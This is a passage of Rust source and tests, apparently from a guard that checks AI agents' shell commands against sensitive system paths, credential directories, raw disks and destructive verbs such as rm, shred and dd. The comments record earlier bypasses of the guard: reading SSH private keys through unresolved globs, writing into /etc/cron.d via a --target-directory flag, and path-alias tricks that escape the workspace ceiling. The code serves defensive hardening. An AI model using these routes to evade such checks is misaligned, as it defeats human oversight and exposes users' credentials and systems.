    for pat in RAW_DEVICE_PREFIXES {
        // Windows 那几个是整条路径形态,仍然按前缀比。
        if pat.starts_with('\\') {
            if lower.starts_with(pat) {
                return Some(format!("{s:?} 是裸块设备"));
            }
            continue;
        }
        // `/dev/sd` → 必须是设备节点(`/dev` 加恰好一段),而且那一段以 `sd` 开头、
        // 后面只跟盘号/分区号。`sdcard-backups` 里那个 `-` 就把它排除了。
        if let Some(设备名) = 裸设备名(&lower) {
            let 前缀 = pat.trim_start_matches("/dev/");
            if let Some(尾) = 设备名.strip_prefix(前缀) {
                if 尾.chars().all(|c| c.is_ascii_alphanumeric()) {
                    return Some(format!("{s:?} 是裸块设备"));
                }
            }
        }
    }

    None
}

/// `/dev/<名字>` 里那个名字 —— 只有恰好两段(`/dev` + 一段)才算设备节点。
///
/// `/dev/sdcard-backups/notes.txt` 有三段,它是一个目录里的文件,不是设备节点。
fn 裸设备名(lower: &str) -> Option<&str> {
    let rest = lower.strip_prefix("/dev/")?;
    if rest.is_empty() || rest.contains('/') {
        return None;
    }
    Some(rest)
}

/// 名字落在系统目录下、但实际是**每用户可写**的暂存区。
///
/// 目前只有一个:macOS 的 `$TMPDIR`,形如 `/var/folders/<两级散列>/T/...`
/// (未折叠时是 `/private/var/folders/...`)。它由 `confstr(_CS_DARWIN_USER_TEMP_DIR)`
/// 分配,权限是每用户 0700,写它是完全正常的操作 —— 而 `/var` 在系统目录表里,
/// 于是不放掉它的话,macOS 上每一次写临时文件都会被判成 Critical。
///
/// 刻意写得很窄:必须是 `/var/folders/<某>/<某>/<某>/...`,至少五段 ——
/// 也就是 `$TMPDIR`(`.../T/`)或缓存目录(`.../C/`)那一层往下。不做
/// `/var/folders` 通配前缀,也不放 `/var` 下面任何别的东西 ——
/// 放宽这个例外等于在系统目录上开口子,而这个函数存在的理由只是消掉一个误报。
fn is_per_user_scratch(path: &Path) -> bool {
    let parts: Vec<String> = path
        .components()
        .filter_map(|c| match c {
            Component::Normal(n) => Some(n.to_string_lossy().to_lowercase()),
            _ => None,
        })
        .collect();
    // ["var", "folders", "<hash1>", "<hash2>", <这一层往下才算>, ...]
    // 未折叠形态开头多一个 "private"。
    let tail = if parts.first().map(String::as_str) == Some("private") {
        &parts[1..]
    } else {
        &parts[..]
    };
    // 至少五段:`/var/folders/<h1>/<h2>/T` 或 `.../C` 往下。
    // 四段(也就是 `<h2>` 那个容器目录本身)**不**放 —— `$TMPDIR` 是它下面的 `T/`,
    // 而容器目录本身不该被当成随便可写的暂存区。窄一点的代价是偶尔一次误报,
    // 宽一点的代价是在 /var 上开了个口子。
    tail.len() >= 5 && tail[0] == "var" && tail[1] == "folders"
}

/// 写/删算敏感的系统目录。
const SYSTEM_DIRS: &[&str] = &[
    "/etc",
    "/bin",
    "/sbin",
    "/lib",
    "/lib64",
    "/usr",
    "/var",
    "/boot",
    "/sys",
    "/proc",
    "/dev",
    "/System",
    "/Library",
    "/Applications",
    "/private/etc",
    "/private/var",
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "C:\\ProgramData",
];

/// 连读都算敏感的凭据位置。
/// 未归约的操作数,按**字面**形状判凭据目录。
///
/// 存在的理由:`sensitive_target` 需要一个已归约的 `Path`,而归约会因为通配符或 `~user`
/// 而失败 —— 于是"归约失败 + Read 意图"在 `check_paths` 里三步全跳过、直接放行。而让归约
/// 失败恰恰是最省事的绕过:`~/.ssh/*`、`~root/.ssh/id_rsa`、`/home/*/.ssh/id_rsa` 全部
/// 曾经是干净的 `Allow`,而这三个构造在真实 shell 里确实读得到私钥。
///
/// 判据只看组件序列,和 `sensitive_target` 用的是同一张表和同一种窗口匹配 —— 把 `~`、
/// `~user`、通配符分量都当作"某个目录",因为它们**展开成什么**不影响"路径里有没有
/// `.ssh` 这一段"这个事实。
pub fn sensitive_literal(operand: &str, intent: PathIntent) -> Option<String> {
    let _ = intent; // 读和写一样:凭据目录是无条件敏感的。
    let s = operand.trim();
    if s.is_empty() {
        return None;
    }
    let components: Vec<String> = s
        .split(['/', '\\'])
        .filter(|c| !c.is_empty() && *c != "." && *c != "..")
        .map(|c| c.to_lowercase())
        .collect();
    for entry in CREDENTIAL_DIRS {
        let want: Vec<String> = entry
            .trim_start_matches('/')
            .split('/')
            .map(|x| x.to_lowercase())
            .collect();
        if components.windows(want.len()).any(|w| w == want.as_slice()) {
            return Some(format!(
                "{s:?} 的字面形状落在凭据目录 {entry} 内（归约不出来也不放行）"
            ));
        }
    }
    None
}

const CREDENTIAL_DIRS: &[&str] = &[
    "/.ssh",
    "/.aws",
    "/.gnupg",
    "/.kube",
    "/.docker/config.json",
    "/library/keychains",
    "/appdata/roaming/microsoft/crypto",
    "/.config/gh",
    "/.netrc",
    "/.pgpass",
    "/.git-credentials",
];

/// 裸块设备前缀。
const RAW_DEVICE_PREFIXES: &[&str] = &[
    "/dev/sd",
    "/dev/nvme",
    "/dev/hd",
    "/dev/disk",
    "/dev/vd",
    "\\\\.\\physicaldrive",
];

/// 从动词和标志推断意图。
///
/// 看的是命令自己的形状，不是宿主的自述。一个自称在 `read` 的 `rm` 必须仍然被判成删除。
pub fn infer_intent(verb: &str, args: &[String]) -> PathIntent {
    let haystack = {
        let mut h = verb.to_lowercase();
        for a in args {
            h.push(' ');
            h.push_str(&a.to_lowercase());
        }
        h
    };
    for token in DELETE_TOKENS {
        if token_present(&haystack, token) {
            return PathIntent::Delete;
        }
    }
    for token in WRITE_TOKENS {
        if token_present(&haystack, token) {
            return PathIntent::Write;
        }
    }
    PathIntent::Read
}

/// 按词边界匹配，避免 `format` 里的 `format` 命中 `mkfs` 之类的误伤，也避免
/// `--no-delete` 被当成 `-delete`。
fn token_present(haystack: &str, token: &str) -> bool {
    haystack
        .split(|c: char| !(c.is_alphanumeric() || c == '-' || c == '_'))
        .any(|w| w == token)
}

/// 判定为删除的词。
///
/// 刻意**不**收 PowerShell 的 `ri` 别名和裸的 `format`：两者都太短太泛，任何恰好等于
/// `ri` 的操作数都会把一次读翻成删除。过度触发方向是"更多 Deny"，听起来安全，实际是让
/// 合法操作被拒 —— 而被拒够多次，人就会把守卫关掉。`mkfs` 和 `dd` 保留，它们本身就只有
/// 破坏性用法。
const DELETE_TOKENS: &[&str] = &[
    "rm",
    "rmdir",
    "unlink",
    "del",
    "erase",
    "rd",
    "shred",
    "srm",
    "wipe",
    "-delete",
    "--delete",
    "remove-item",
    "mkfs",
    "dd",
    "truncate",
    "delete_system",
    "delete",
    "trash",
];

const WRITE_TOKENS: &[&str] = &[
    "write_file",
    "write",
    "tee",
    "cp",
    "copy",
    "mv",
    "move",
    "install",
    "touch",
    "mkdir",
    "chmod",
    "chown",
    "ln",
    "set-content",
    "add-content",
    "out-file",
    "patch",
];

/// 一个被判过的路径操作数。
#[derive(Debug, Clone)]
pub struct PathClaim {
    /// 原始操作数。
    pub operand: String,
    /// 归约后的绝对路径，归约失败时为 `None`。
    pub resolved: Option<PathBuf>,
    /// 归约失败的原因。
    pub unprovable: Option<String>,
    pub intent: PathIntent,
}

/// 一个操作数看起来像不像路径。
///
/// 宁可多判：把一个不是路径的东西按路径检查一遍，代价是可能多一次 `Ask`；把一个是路径的东西
/// 漏掉，代价是整个模块对它无效。
pub fn looks_like_path(operand: &str) -> bool {
    let s = operand.trim();
    if s.is_empty() {
        // 空串要交给 resolve 去报"退化成当前目录"，所以算路径。
        return true;
    }
    // 带 scheme 的 URL 不是文件系统路径。
    //
    // 以前它们**是**被当成路径的(因为含 `/`),归约必然失败(`?` 是通配符),而"归约失败
    // 的读"当时是静默放行的,所以没人看见。把"归约不出来的读"改成明确的 `Ask` 之后,
    // `https://ok.example/search?a=1&b=2` 立刻变成一次误报 —— 于是暴露出这个更根本的
    // 分类错误:这一层对 URL 无话可说,而假装它能说,正是 C1 那种虚构包含性证明的来源。
    //
    // URL 的判定归元字符筛子和 `url_arg_tools` 管;路径模型对它保持沉默,而且是**有据可查
    // 的**沉默(压根不产生 claim),不是"产生了 claim 然后三步都跳过"。
    if let Some(i) = s.find("://") {
        let scheme = &s[..i];
        if !scheme.is_empty()
            && scheme
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
        {
            return false;
        }
    }
    // 纯标志不是路径。`-delete`、`--recursive`、`/s`（Windows 风格标志）。
    //
    // 但 `--flag=PATH` **是**一个路径操作数,以前它整个被这一行吞掉了:
    // `cp --target-directory=/etc/cron.d SRC` 的写目标从判决里整个消失,只剩来源被判,
    // 而来源在天花板内,于是天花板"证明"通过、免确认、执行。复核实测:
    //
    // ```text
    // cp SRC /etc/cron.d/evil               -> Deny [SHELL-PATH-SENSITIVE]
    // cp --target-directory=/etc/cron.d SRC -> Ask  [SHELL-CONFIRM]   然后被天花板免掉
    // ```
    //
    // 顺带还错了一处审计:只剩一个可见路径操作数时,`assign_intents` 的"最后一个是目标"
    // 分支不成立,于是整条命令的 Write 意图落在**来源**上 —— 审计会说"写了 ws/evil.conf",
    // 而真正被写的 `/etc/cron.d/evil.conf` 在任何地方都没出现过。
    if s.starts_with('-') {
        return flag_value(s).is_some_and(looks_like_path);
    }
    if s.starts_with('~') || s.starts_with('/') || s.starts_with('\\') {
        return true;
    }
    if s.contains('/') || s.contains('\\') {
        return true;
    }
    // `C:` 开头。
    let b = s.as_bytes();
    if b.len() >= 2 && b[0].is_ascii_alphabetic() && b[1] == b':' {
        return true;
    }
    // 带扩展名的裸文件名。
    if let Some(dot) = s.rfind('.') {
        if dot > 0 && dot + 1 < s.len() && s[dot + 1..].chars().all(|c| c.is_alphanumeric()) {
            return true;
        }
    }
    false
}

/// `--flag=VALUE` / `-o=VALUE` 里的 VALUE。不是这个形状就返回 `None`。
///
/// 只取 `=` 之后的部分。`-o VALUE` 那种分开写的形式不需要这里处理 —— VALUE 本来就是
/// 一个独立操作数,会被单独看到。
pub fn flag_value(operand: &str) -> Option<&str> {
    let s = operand.trim();
    if !s.starts_with('-') {
        return None;
    }
    let (_, v) = s.split_once('=')?;
    (!v.is_empty()).then_some(v)
}

/// 这个操作数不可能是**一条**路径吗?`Some(理由)` = 不可能。
///
/// 只在 `resolve` 里用,而且只用来拒绝 —— 不是用来放行。判据故意保守:文件名里带空格是
/// 正常的(`My Documents/report final.pdf`),所以"带空格"本身不构成拒绝;拒绝的是
/// "带空格**并且**看起来含有第二个路径分量",以及解释器语法里那几个在真实文件名中极
/// 罕见、而在代码里必然出现的字符。
pub fn not_a_single_path(raw: &str) -> Option<String> {
    // 解释器语法。`(` `)` 出现在 `open(...)`、`$(...)`、函数调用里;引号出现在任何
    // 内联脚本里。这些在文件名里合法但极少,而它们出现时几乎总意味着"这不是路径"。
    for c in ['(', ')', '\'', '"', '\n', '\r', '\t', ';', '|', '`', '&'] {
        if raw.contains(c) {
            return Some(format!(
                "操作数含 {c:?},这不是一条路径而是一段命令;无法据此证明包含关系"
            ));
        }
    }
    // 空白之后出现第二个**绝对**路径,或者任何一个标志 —— 那是一条命令,不是一条路径。
    //
    // 判据要挑得很小心。文件名里带空格是完全正常的(`My Documents/report final.pdf`),
    // 所以"含空白"本身不能构成拒绝,"含两个带斜杠的词"也不能 ——
    // `/tmp/ws/My Documents/x.pdf` 就是两个带斜杠的词。
    //
    // 真正的区别是:在**一条**路径里,只有开头那一段可以是绝对的。第二个词又以 `/` 或
    // `~` 开头,只能意味着这里有第二个路径,也就是有一个动词在前面。标志同理:一条路径
    // 里不会有独立的 `-rf` 这种词。
    let mut words = raw.split_whitespace();
    let _first = words.next();
    for w in words {
        if w.starts_with('/') || w.starts_with('~') {
            return Some(format!(
                "操作数 {raw:?} 在空白之后又出现一个绝对路径 {w:?},这是一条命令而不是一条路径"
            ));
        }
        if w.starts_with('-') && w.len() > 1 {
            return Some(format!(
                "操作数 {raw:?} 含独立的标志 {w:?},这是一条命令而不是一条路径"
            ));
        }
    }
    None
}

/// 最后一个路径操作数是目标、前面的是来源的命令。
///
/// Unix 的约定：`cp a b c dest/`、`mv a b`、`ln -s target link`、`install src dst`。
const LAST_OPERAND_IS_DESTINATION: &[&str] =
    &["cp", "copy", "mv", "move", "install", "ln", "rsync", "scp"];

/// 一个命令是不是"最后一个操作数才是写入目标"的形状。
pub fn last_operand_is_destination(verb: &str, args: &[String]) -> bool {
    let mut h = verb.to_lowercase();
    for a in args {
        h.push(' ');
        h.push_str(&a.to_lowercase());
    }
    LAST_OPERAND_IS_DESTINATION
        .iter()
        .any(|t| token_present(&h, t))
}

/// 给每个路径操作数分配意图。
///
/// # 为什么不能所有操作数共用一个意图
///
/// 第一版就是那样做的，结果 `cp /etc/passwd ~/proj/out` 被拒：动词是 `cp` 所以整条命令的意图
/// 是 Write，于是 `/etc/passwd` 作为"写系统目录"被判无条件敏感 —— 可是这条命令只是**读**它。
/// 一次干净的误拒，而且是常见操作。
///
/// 对于 `cp`/`mv`/`ln` 这一类形状明确的命令，最后一个路径是目标（写），前面的是来源（读）。
/// 其余命令（`rm`、`find -delete`、`write_file`）所有路径操作数同意图，因为它们本来就只有一种。
pub fn assign_intents(verb: &str, args: &[String], path_operand_count: usize) -> Vec<PathIntent> {
    // 意图推断只在找动词和标志,而动词和标志都很短。超长的 haystack 条目直接跳过。
    //
    // 这一条是我自己在这一轮里引进的:把 `target` 加进 haystack(为了让 `sudo rm` 的
    // `rm` 可见)以后,一个 1 MB 的操作数就要被所有关键词各扫一遍 —— `path_claims` 从
    // 微秒变成 1.77 秒。而这个形状**原本**也能通过 `args` 达到,只是没人测过。
    //
    // 上限取 4096(主流系统的 PATH_MAX):比它长的东西不可能是动词,也不可能是标志,
    // 而作为路径它也已经在 `resolve` 那道 8192 字节的闸门之外了。
    const MAX_HAYSTACK_ENTRY: usize = 4096;
    let filtered: Vec<String> = args
        .iter()
        .filter(|a| a.len() <= MAX_HAYSTACK_ENTRY)
        .cloned()
        .collect();
    let args = &filtered[..];
    let verb = if verb.len() <= MAX_HAYSTACK_ENTRY {
        verb
    } else {
        ""
    };
    let overall = infer_intent(verb, args);
    if path_operand_count == 0 {
        return Vec::new();
    }
    if overall.needs_write() && path_operand_count >= 2 && last_operand_is_destination(verb, args) {
        let mut out = vec![PathIntent::Read; path_operand_count - 1];
        out.push(overall);
        return out;
    }
    vec![overall; path_operand_count]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(target_os = "windows"))]
    fn ctx() -> ResolveContext {
        ResolveContext::with(Some("/home/agent"), Some("/home/agent/proj"))
    }

    #[cfg(target_os = "windows")]
    fn ctx() -> ResolveContext {
        // 用真实的 Windows 绝对路径。`/home/agent` 在 Windows 上只有根分隔符、没有盘符，
        // 并不是绝对路径；拿它做夹具会测到当前盘符拼接，而不是家目录/工作目录语义。
        // 只取系统临时目录的盘符根，再接一个本进程唯一且不创建的目录。
        // 这避免 Windows 对已存在的 `%TEMP%` 前缀有时返回 `RUNNER~1`、有时返回
        // `\\?\C:\Users\runneradmin` 的表示差异，让测试只聚焦 `~`、相对路径和 `..` 语义。
        let home = root_of(&std::env::temp_dir())
            .join(format!("agentguard-path-tests-{}", std::process::id()))
            .join("home")
            .join("agent");
        let cwd = home.join("proj");
        ResolveContext {
            home: Some(home),
            cwd: Some(cwd),
        }
    }

    fn no_base_ctx() -> ResolveContext {
        ResolveContext {
            home: None,
            cwd: None,
        }
    }

    fn resolve_absolute(path: &Path) -> PathBuf {
        resolve(&path.to_string_lossy(), no_base_ctx()).unwrap()
    }

    fn assert_same_path(left: &Path, right: &Path) {
        assert!(
            is_within(left, right) && is_within(right, left),
            "路径应当语义等价：left={left:?}, right={right:?}"
        );
    }

    // ---------- 归约 ----------

    // ---------- macOS 卷别名(在 Linux 上也跑) ----------

    /// **这一轮补的判决 bug。** 用户自己的文档不能因为路过 firmlink 就被判成系统文件。
    ///
    /// macOS 上 `canonicalize` 会把用户路径解成 `/System/Volumes/Data/...`,
    /// 而 `/System` 在敏感目录表里。一次外部评审在 macOS 上跑出 8 个失败,全是这个。
    ///
    /// 这条测试**在 Linux 上也跑** —— 输入是写死的 macOS 形状字符串,不碰文件系统。
    /// 这是刻意的:如果做成 `#[cfg(target_os = "macos")]`,这个 bug 就永远只有
    /// macOS 能发现,而这个仓库已经为同一个形状吃过一次亏。
    #[test]
    fn 数据卷前缀下的用户文档不算敏感() {
        for p in [
            "/System/Volumes/Data/Users/me/Documents/x.md",
            "/System/Volumes/Data/home/agent/proj/a.txt",
        ] {
            assert_eq!(
                sensitive_target_full(
                    Path::new(p),
                    PathIntent::Delete,
                    Some(Path::new("/home/agent")),
                    VolumeAliases::Fold,
                ),
                None,
                "{p} 被误判成敏感"
            );
        }
    }

    /// 危险的那个方向:写成 `/etc` 的策略必须能命中 `/private/etc`。
    ///
    /// 误判成敏感只是误报,吵但安全。**漏判**才要命 —— 一条写成 `/etc/**` 的规则
    /// 拿到 `/private/etc/passwd` 时前缀匹配不成立,规则静默地不生效。
    #[test]
    fn private别名下的系统目录仍然算敏感() {
        for (p, 期望片段) in [
            ("/private/etc/hosts", "/etc"),
            ("/private/var/db/x", "/var"),
        ] {
            let got =
                sensitive_target_full(Path::new(p), PathIntent::Write, None, VolumeAliases::Fold)
                    .unwrap_or_else(|| panic!("{p} 漏判了 —— 这是那个危险的方向"));
            assert!(got.contains(期望片段), "{p} 的理由里没有 {期望片段}:{got}");
        }
    }

    /// `/private` 下面只有 etc / var / tmp 是别名,不做通配。
    ///
    /// 一个真叫 `/private/myproject` 的目录不该被折成 `/myproject` —— 那会把一条
    /// 普通路径改写成另一条,而改写后的那条可能正好命中某条策略。
    #[test]
    fn private下面只折已知的三个名字() {
        assert_eq!(
            dealias_platform_volumes(Path::new("/private/myproject/src")),
            PathBuf::from("/private/myproject/src")
        );
        assert_eq!(
            dealias_platform_volumes(Path::new("/private/etcetera/x")),
            PathBuf::from("/private/etcetera/x"),
            "前缀匹配写松了:etcetera 被当成 etc 了"
        );
    }

    /// 对真实的 Linux 路径必须是恒等变换 —— 无条件生效的前提就是这一条。
    #[test]
    fn 普通路径不受折叠影响() {
        for p in [
            "/home/agent/proj/a.txt",
            "/etc/hosts",
            "/var/log/syslog",
            "/tmp/x",
            "/usr/local/bin/tool",
            "/Systemd/x",
            "/System/Library/Frameworks",
        ] {
            assert_eq!(
                dealias_platform_volumes(Path::new(p)),
                PathBuf::from(p),
                "{p} 被动了"
            );
        }
    }

    /// `/System/Library` 这类**真正的**系统路径不能被折掉。
    ///
    /// 只有 `/System/Volumes/Data` 那个前缀是数据卷根。写松成 `/System/` 的话,
    /// `/System/Library/Frameworks` 会折成 `/Library/Frameworks` —— 仍然敏感,
    /// 但那是碰巧;`/System/Applications` 折成 `/Applications` 也是碰巧。
    /// 靠碰巧的安全属性下一次改动就没了。
    #[test]
    fn 真正的system路径不被折叠() {
        assert!(
            sensitive_target_full(
                Path::new("/System/Library/Frameworks/x.framework"),
                PathIntent::Write,
                None,
                VolumeAliases::Fold,
            )
            .is_some(),
            "真正的 /System 路径漏判了"
        );
    }

    /// **只有 macOS 折叠卷别名。**
    ///
    /// 这条盯的是 `for_host()` 本身。上面那两条都**注入** `VolumeAliases`,
    /// 所以把 `for_host()` 改成无条件 `Fold`(也就是把 F1 那个越界放回去)
    /// 它们一条都不会红 —— 变异测试当场证明了这一点。
    ///
    /// 注入让"在 Linux 上也测得到 macOS 语义"成立;这一条让"只在 macOS 上生效"
    /// 也有人盯着。两条缺一不可。
    #[test]
    fn 只有macos折叠卷别名() {
        let 期望 = if cfg!(target_os = "macos") {
            VolumeAliases::Fold
        } else {
            VolumeAliases::Keep
        };
        assert_eq!(
            VolumeAliases::for_host(),
            期望,
            "折叠是一条 macOS 的文件系统事实。在别的平台上它是改写而不是归一化,\
             而改写会让守卫判决的路径和执行方写入的路径分家(见 VolumeAliases 的文档)"
        );
    }

    /// 走**真正的入口** `resolve()`(不注入),在非 macOS 宿主上不能折叠。
    ///
    /// 上一条是对 `for_host()` 的单元断言;这一条是端到端的那个性质本身 ——
    /// 一个别名形状的操作数,归约结果必须还是它自己,于是执行方拿到的和守卫判过的
    /// 是同一个路径。
    #[cfg(all(unix, not(target_os = "macos")))]
    #[test]
    fn 非macos宿主上真实resolve不改写别名路径() {
        let ctx = ResolveContext::with(Some("/tmp"), Some("/tmp"));
        let 操作数 = "/System/Volumes/Data/tmp/ws/x";
        assert_eq!(
            resolve(操作数, ctx).unwrap(),
            PathBuf::from(操作数),
            "resolve 改写了别名路径 —— 执行方会写到和判决对象不同的文件上"
        );
    }

    /// Windows 也必须钉住“不把 macOS 路径别名套到本机路径上”，但夹具必须是带盘符的
    /// Windows 绝对路径。`/System/...` 在 Windows 上是当前盘根相对路径，不能代表执行方
    /// 真正会收到的路径。
    #[cfg(target_os = "windows")]
    #[test]
    fn windows宿主上不改写macos别名形状() {
        let root = root_of(&std::env::temp_dir());
        let original = root
            .join("System")
            .join("Volumes")
            .join("Data")
            .join("agentguard")
            .join("tmp")
            .join("ws")
            .join("x");
        let other = root.join("agentguard").join("tmp").join("ws").join("x");
        let got = resolve(&original.to_string_lossy(), no_base_ctx()).unwrap();

        // `canonicalize` 可能把普通盘符变成 `\\?\C:\...`；两者仍必须被识别为同一位置。
        assert!(
            is_within(&original, &got) && is_within(&got, &original),
            "Windows 本机路径被改写了：{original:?} -> {got:?}"
        );
        assert!(
            !is_within(&other, &got),
            "Windows 路径被错误套用 macOS 卷别名：{got:?}"
        );

        // 即使测试显式注入 Fold，带盘符的 Windows 路径也不能被当成 `/System/...`。
        let folded = resolve_with_aliases(
            &original.to_string_lossy(),
            no_base_ctx(),
            VolumeAliases::Fold,
        )
        .unwrap();
        assert!(is_within(&original, &folded) && is_within(&folded, &original));
        assert!(!is_within(&other, &folded));
        assert!(folded.is_absolute());
    }

    /// **`resolve` 里那个折叠必须有测试盯着 —— 而且要走 `resolve`。**
    ///
    /// 这条测试的上一版不合格,是一次独立复核用变异测试证明的:它调的是
    /// `dealias_platform_volumes`,没调 `resolve`,所以把折叠从 `resolve` 里
    /// **整段删掉**,测试照样全绿。文档注释说它钉住的是"两边都过一遍 resolve",
    /// 而它验的只是那个辅助函数和自己一致。
    ///
    /// 那正是这个仓库反复提防的形状:机制存在、被直接测过、然后什么都没接上。
    #[cfg(unix)]
    #[test]
    fn resolve在macos模式下折叠数据卷前缀() {
        let ctx = || ResolveContext::with(Some("/home/agent"), Some("/home/agent"));
        // Fold(macOS 语义):数据卷前缀被去掉。
        assert_eq!(
            resolve_with_aliases(
                "/System/Volumes/Data/home/agent/proj/a.txt",
                ctx(),
                VolumeAliases::Fold
            )
            .unwrap(),
            PathBuf::from("/home/agent/proj/a.txt")
        );
        // Keep(其它平台):原样。**这一半才是 F1 那个洞的补丁。**
        assert_eq!(
            resolve_with_aliases(
                "/System/Volumes/Data/home/agent/proj/a.txt",
                ctx(),
                VolumeAliases::Keep
            )
            .unwrap(),
            PathBuf::from("/System/Volumes/Data/home/agent/proj/a.txt")
        );
    }

    /// **折叠不能让守卫判决的路径和执行方写入的路径分家。**
    ///
    /// 这是一次独立对抗性复核跑出来的越界,而它是我上一轮引入的:
    ///
    /// ```text
    /// 天花板        /tmp/ws
    /// 操作数        /System/Volumes/Data/tmp/ws/pwned.txt
    /// 守卫判决用的  /tmp/ws/pwned.txt      <- 折过的 → 判成在天花板内,还跳过了人工确认
    /// 执行方写的    /System/Volumes/Data/tmp/ws/pwned.txt   <- 原始的
    /// ```
    ///
    /// 在 macOS 上两者是同一个 inode(firmlink),不分叉。在 Linux 上是两个文件 ——
    /// 而 `guard-gateway` / `guard-jail` 跑在 Linux 上,后者的执行器还自带
    /// `create_dir_all`,能把这个目录形状创建出来。
    ///
    /// 原来的理由是"Linux 上没有 `/System/Volumes/Data` 这种路径" —— 那是对文件系统的
    /// 假设,不是函数的性质,而且没有任何东西在保证它。
    #[cfg(unix)]
    #[test]
    fn 非macos平台上别名路径不被判成在天花板内() {
        let ctx = || ResolveContext::with(Some("/tmp"), Some("/tmp"));
        let 天花板 = resolve_with_aliases("/tmp/ws", ctx(), VolumeAliases::Keep).unwrap();
        let 目标 =
            resolve_with_aliases("/System/Volumes/Data/tmp/ws/x", ctx(), VolumeAliases::Keep)
                .unwrap();
        assert!(
            !is_within(&天花板, &目标),
            "别名路径被判成在天花板 {:?} 内(解成 {:?}),而执行方会写到别的地方",
            天花板,
            目标
        );

        // macOS 模式下反而**应该**判成在内 —— 那边它们确实是同一个文件。
        let 天花板m = resolve_with_aliases("/tmp/ws", ctx(), VolumeAliases::Fold).unwrap();
        let 目标m =
            resolve_with_aliases("/System/Volumes/Data/tmp/ws/x", ctx(), VolumeAliases::Fold)
                .unwrap();
        assert!(is_within(&天花板m, &目标m), "macOS 语义下应该判成在内");
    }

    /// **macOS 上用户自己的临时目录不能被判成系统目录。**
    ///
    /// `$TMPDIR` 是 `/var/folders/<两级散列>/T/`,而 `/var` 在系统目录表里,
    /// 于是在 macOS 上每一次写临时文件都被判成 Critical + 要人确认。
    /// 一个在正常路径上狂叫的守卫会被关掉 —— 这句话这个项目已经付过学费。
    ///
    /// 先前就存在(`/private/var` 早就在表里),一次独立复核指出来的。
    #[test]
    fn macos的每用户临时目录不算系统目录() {
        for p in [
            "/var/folders/qz/9x1abc/T/agentguard/out.txt",
            "/private/var/folders/qz/9x1abc/T/agentguard/out.txt",
            "/var/folders/qz/9x1abc/C/cache.bin",
        ] {
            for intent in [PathIntent::Write, PathIntent::Delete] {
                assert_eq!(
                    sensitive_target_full(Path::new(p), intent, None, VolumeAliases::Fold),
                    None,
                    "{p} ({intent:?}) 被判成系统目录 —— macOS 上每次写临时文件都会要人确认"
                );
            }
        }
    }

    /// 但这个例外必须**很窄** —— 放宽它等于在系统目录上开口子。
    #[test]
    fn 临时目录例外不外溢到var其它地方() {
        for p in [
            "/var/log/syslog",
            "/var/spool/cron/root",
            "/var/folders",           // 段数不够
            "/var/folders/qz",        // 段数不够
            "/var/folders/qz/9x1abc", // 刚好不够(需要第四段)
            "/var/foldersx/qz/9x1abc/T/x",
            "/var/lib/folders/a/b/c",
        ] {
            assert!(
                sensitive_target_full(Path::new(p), PathIntent::Write, None, VolumeAliases::Fold)
                    .is_some(),
                "{p} 被例外放掉了 —— 那是在系统目录上开口子"
            );
        }
    }

    /// 裸设备判定按**组件**,不按字符串前缀。
    ///
    /// 上一版是 `lower.starts_with("/dev/sd")`,于是
    /// `/dev/sdcard-backups/notes.txt` 被判成裸块设备 —— 一次误拒。
    /// 这个文件里 `CREDENTIAL_DIRS` 早就为同一个理由换成了组件窗口,这张表被落下了。
    /// 一次独立复核指出来的。
    #[test]
    fn 裸设备判定不误伤同名目录() {
        // 真的设备节点:必须判到。
        for p in [
            "/dev/sda",
            "/dev/sda1",
            "/dev/nvme0n1",
            "/dev/disk0",
            "/dev/vda",
            "/dev/hdb2",
        ] {
            let got = sensitive_target_with_home(Path::new(p), PathIntent::Read, None)
                .unwrap_or_else(|| panic!("{p} 漏判了 —— 写它等于绕过文件系统覆写磁盘"));
            assert!(got.contains("裸块设备"), "{p}: {got}");
        }
        // 名字里带这些前缀的**目录**:不能误伤。
        for p in [
            "/dev/sdcard-backups/notes.txt",
            "/dev/nvme-notes/readme.md",
            "/dev/diskette-archive/x",
            "/dev/hdmi-config/settings",
            "/dev/video0",
        ] {
            let got = sensitive_target_with_home(Path::new(p), PathIntent::Read, None);
            assert!(
                !got.as_deref().unwrap_or("").contains("裸块设备"),
                "{p} 被误判成裸块设备:{got:?} —— 误拒的代价是让人把守卫关掉"
            );
        }
    }

    /// 折叠是幂等的 —— `resolve` 和 `sensitive_target` 各做一次,结果必须一样。    /// 折叠是幂等的 —— `resolve` 和 `sensitive_target` 各做一次,结果必须一样。
    #[test]
    fn 折叠是幂等的() {
        for p in [
            "/System/Volumes/Data/Users/me/x",
            "/private/etc/hosts",
            "/home/agent/x",
        ] {
            let once = dealias_platform_volumes(Path::new(p));
            let twice = dealias_platform_volumes(&once);
            assert_eq!(once, twice, "{p} 折两次和折一次不一样");
        }
    }

    /// 数据卷根本身折成 `/`,不能折出一个相对路径。
    #[cfg(unix)]
    #[test]
    fn 数据卷根折成根() {
        assert_eq!(
            dealias_platform_volumes(Path::new("/System/Volumes/Data")),
            PathBuf::from("/")
        );
        assert_eq!(
            dealias_platform_volumes(Path::new("/System/Volumes/Data/")),
            PathBuf::from("/")
        );
        // 折出来的必须还是绝对路径 —— 相对路径会让后面每一处前缀匹配都失效。
        for p in [
            "/System/Volumes/Data",
            "/System/Volumes/Data/",
            "/private/etc",
        ] {
            assert!(
                dealias_platform_volumes(Path::new(p)).is_absolute(),
                "{p} 折出了相对路径"
            );
        }
    }

    /// 家目录本身也要归一化后再比。
    ///
    /// 否则 `/Users/me` 和 `/System/Volumes/Data/Users/me` 被当成两个目录,
    /// 于是"删掉整个家目录"这条判不出来。
    #[test]
    fn 家目录经过别名也认得出来() {
        assert!(
            sensitive_target_full(
                Path::new("/System/Volumes/Data/Users/me"),
                PathIntent::Delete,
                Some(Path::new("/Users/me")),
                VolumeAliases::Fold,
            )
            .is_some(),
            "经过数据卷别名的家目录没被认出来"
        );
    }

    #[test]
    fn 波浪号展开成家目录() {
        let context = ctx();
        let home = context.home.clone().unwrap();
        assert_eq!(
            resolve("~", context.clone()).unwrap(),
            resolve_absolute(&home)
        );
        assert_eq!(
            resolve("~/proj/a.txt", context).unwrap(),
            resolve_absolute(&home.join("proj").join("a.txt"))
        );
    }

    #[test]
    fn 不知道家目录时波浪号归约失败而不是当成字面目录名() {
        // 当成字面目录名的后果：`~/x` 变成相对路径 `./~/x`，于是一条本该指向家目录的删除
        // 被判成在工作区内。
        let no_home = ResolveContext::with(None, Some("/tmp"));
        assert!(resolve("~/x", no_home).is_err());
